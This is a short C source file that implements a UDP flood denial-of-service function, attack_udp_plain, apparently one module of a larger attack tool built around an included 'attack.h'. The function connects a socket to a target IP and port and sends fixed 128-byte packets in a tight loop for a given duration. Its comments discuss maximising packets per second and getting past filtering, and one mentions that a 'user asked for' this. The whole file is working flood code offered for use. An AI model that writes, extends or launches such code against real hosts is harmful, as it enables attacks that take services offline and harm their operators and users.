#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <time.h>
#include <fcntl.h>

#include "attack.h"

// Simple UDP Flood (High PPS)
void attack_udp_plain(uint32_t ip, uint16_t port, uint32_t duration) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return;

    struct sockaddr_in dest;
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr.s_addr = ip;

    // Connect logic for UDP optimization (kernel routing cache)
    connect(sock, (struct sockaddr *)&dest, sizeof(dest));

    // Random Payload buffer (keep it small for PPS, or large - user asked for PPS/UDP)
    // 512 is standard DNS-like size, good balance.
    // For pure PPS, 0-1 byte is best, but often filtered. 64-128 is "safe".
    char packet[128];
    memset(packet, 0x41, sizeof(packet)); // AAAAA...

    time_t end_time = time(NULL) + duration;
    
    // High speed loop
    while (time(NULL) < end_time) {
        // Since we connected, we can use send() instead of sendto() for slightly faster syscall
        send(sock, packet, sizeof(packet), 0);
        // send(sock, packet, sizeof(packet), 0); // Double send unrolling
    }

    close(sock);
}
